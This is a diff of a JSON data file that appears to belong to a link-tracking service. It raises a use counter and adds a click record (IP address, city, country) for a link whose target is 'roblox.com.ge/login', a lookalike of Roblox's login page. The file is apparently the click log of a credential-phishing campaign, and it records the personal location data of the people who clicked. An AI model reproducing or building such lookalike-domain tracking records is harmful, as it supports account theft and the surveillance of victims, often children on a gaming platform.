@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1648,
+    "useCount": 1649,
     "createdBy": "admin",
     "clicks": [
       {
@@ -13352,6 +13352,14 @@
         "city": "Iloilo City",
         "flag": "🇵🇭",
         "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777575439986,
+        "ip": "181.176.82.65",
+        "country": "Peru",
+        "city": "Lima",
+        "flag": "🇵🇪",
+        "countryCode": "PE"
       }
     ]
   },
